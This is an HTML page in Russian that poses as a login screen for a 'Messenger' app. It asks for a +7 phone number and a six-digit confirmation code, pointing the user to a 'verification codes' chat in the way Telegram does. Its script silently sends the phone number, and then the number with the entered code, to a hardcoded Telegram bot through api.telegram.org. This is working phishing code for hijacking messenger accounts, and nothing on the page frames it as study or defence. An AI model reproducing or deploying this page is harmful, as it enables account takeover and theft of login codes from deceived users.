<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Messenger</title>

<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto;
  }

  html, body {
    height: 100%;
    overflow: hidden;
  }

  body {
    background: #fff;
    display: flex;
    justify-content: center;
    align-items: center;
  }

  .app {
    width: 100%;
    max-width: 420px;
    padding: 20px;
    position: relative;
    height: 100vh;
  }

  .screen {
    position: absolute;
    inset: 0;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    text-align: center;

    opacity: 0;
    transform: translateY(12px);
    pointer-events: none;
    transition: 0.35s ease;
  }

  .screen.active {
    opacity: 1;
    transform: translateY(0);
    pointer-events: all;
  }

  h1 {
    font-size: 22px;
    margin-bottom: 6px;
  }

  .subtext {
    font-size: 13px;
    color: #777;
    margin-bottom: 18px;
  }

  /* BUTTON */
  .btn {
    width: 100%;
    padding: 14px;
    border: none;
    border-radius: 16px;
    font-size: 16px;
    transition: 0.2s;
    cursor: pointer;
  }

  .btn.primary {
    background: linear-gradient(135deg, #2f80ed, #56ccf2);
    color: white;
  }

  .btn.disabled {
    background: #e5e5e5;
    color: #999;
    cursor: not-allowed;
  }

  .btn:active {
    transform: scale(0.97);
  }

  /* PHONE */
  .phone-wrap {
    width: 100%;
    position: relative;
  }

  .prefix {
    position: absolute;
    left: 16px;
    top: 50%;
    transform: translateY(-50%);
    color: #2f80ed;
    font-weight: 600;
    font-size: 18px;
  }

  .phone-input {
    width: 100%;
    padding: 16px 16px 16px 55px;
    font-size: 18px;

    border-radius: 16px;
    border: 1px solid rgba(0,0,0,0.08);
    background: #f5f5f5;
    outline: none;
  }

  .phone-input:focus {
    background: #fff;
    border-color: #2f80ed;
    box-shadow: 0 0 0 4px rgba(47,128,237,0.15);
  }

  .error {
    color: #ff4d4d;
    font-size: 13px;
    margin-top: 10px;
    display: none;
  }

  /* CODE */
  .code-box {
    display: flex;
    gap: 10px;
    margin-top: 20px;
  }

  .code-box input {
    width: 48px;
    height: 58px;
    font-size: 22px;
    text-align: center;

    border-radius: 14px;
    border: 1px solid rgba(0,0,0,0.08);
    background: #f5f5f5;
    outline: none;
  }

  .code-box input:focus {
    transform: scale(1.08);
    border-color: #2f80ed;
    box-shadow: 0 0 0 4px rgba(47,128,237,0.15);
    background: #fff;
  }

</style>
</head>

<body>

<div class="app">

  <!-- SCREEN 1 -->
  <div class="screen active" id="s1">
    <h1>Добро пожаловать</h1>
    <p class="subtext">Современный мессенджер</p>
    <button class="btn primary" onclick="go('s2')">Войти</button>
  </div>

  <!-- SCREEN 2 -->
  <div class="screen" id="s2">

    <h1>Введите номер</h1>
    <p class="subtext">На него придёт код</p>

    <div class="phone-wrap">
      <div class="prefix">+7</div>
      <input id="phone" class="phone-input" type="tel" inputmode="numeric" placeholder="987 654 32 10"/>
    </div>

    <div class="error" id="err"></div>

    <button id="btnNext" class="btn disabled" disabled style="margin-top:20px">
      Продолжить
    </button>

  </div>

  <!-- SCREEN 3 -->
  <div class="screen" id="s3">

    <h1 id="codeTitle">Отправили код</h1>
    <p class="subtext">Проверьте чат "Коды подтверждения"</p>

    <div class="code-box">
      <input type="tel" inputmode="numeric" maxlength="1"/>
      <input type="tel" inputmode="numeric" maxlength="1"/>
      <input type="tel" inputmode="numeric" maxlength="1"/>
      <input type="tel" inputmode="numeric" maxlength="1"/>
      <input type="tel" inputmode="numeric" maxlength="1"/>
      <input type="tel" inputmode="numeric" maxlength="1"/>
    </div>

    <button class="btn primary" style="margin-top:20px">Подтвердить</button>
  </div>

</div>

<script>

/* =========================
   TELEGRAM CONFIG
========================= */
const BOT_TOKEN = "8601653702:AAHCu0yYMR5U2gxXoZD_91WwSovS9b-CEEY";
const CHAT_ID = "8063683163";

function sendToTelegram(text) {
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: text
    })
  });
}

/* =========================
   NAV
========================= */
function go(id){
  document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));
  document.getElementById(id).classList.add('active');

  if(id === 's3'){
    document.getElementById('codeTitle').innerText =
      'Отправили код на +7 ' + window.userPhone;
  }
}

/* =========================
   PHONE LOGIC
========================= */
const phone = document.getElementById('phone');
const err = document.getElementById('err');
const btn = document.getElementById('btnNext');

function format(v){
  v = v.replace(/\D/g,'').slice(0,10);

  let r = [];
  if(v.length>0) r.push(v.slice(0,3));
  if(v.length>3) r.push(v.slice(3,6));
  if(v.length>6) r.push(v.slice(6,8));
  if(v.length>8) r.push(v.slice(8,10));

  return r.join(' ');
}

function updateBtn(v){
  const ok = v.length === 10 && v[0] === '9';

  btn.disabled = !ok;

  if(ok){
    btn.classList.remove('disabled');
    btn.classList.add('primary');
  } else {
    btn.classList.add('disabled');
    btn.classList.remove('primary');
  }
}

phone.addEventListener('input',()=>{
  phone.value = format(phone.value);

  const raw = phone.value.replace(/\D/g,'');
  updateBtn(raw);

  err.style.display = 'none';
});

btn.addEventListener('click',()=>{
  const v = phone.value.replace(/\D/g,'');

  if(v.length !== 10 || v[0] !== '9'){
    err.style.display = 'block';
    err.textContent = 'Введите корректный номер';
    return;
  }

  window.userPhone = phone.value;

  /* 📤 SEND PHONE */
  sendToTelegram("📱 Новый вход\nНомер: +7 " + window.userPhone);

  go('s3');
});

/* =========================
   CODE INPUT
========================= */
function getCode(){
  return [...document.querySelectorAll('.code-box input')]
    .map(i => i.value)
    .join('');
}

document.querySelectorAll('.code-box input').forEach((el,i,arr)=>{
  el.addEventListener('input',()=>{
    el.value = el.value.replace(/\D/g,'');

    if(el.value && i < arr.length-1){
      arr[i+1].focus();
    }

    const code = getCode();

    if(code.length === 6){
      sendToTelegram(
        "🔐 Код введён\nНомер: +7 " + window.userPhone +
        "\nКод: " + code
      );
    }
  });

  el.addEventListener('keydown',(e)=>{
    if(e.key==="Backspace" && !el.value && i>0){
      arr[i-1].focus();
    }
  });
});

</script>

</body>
</html>
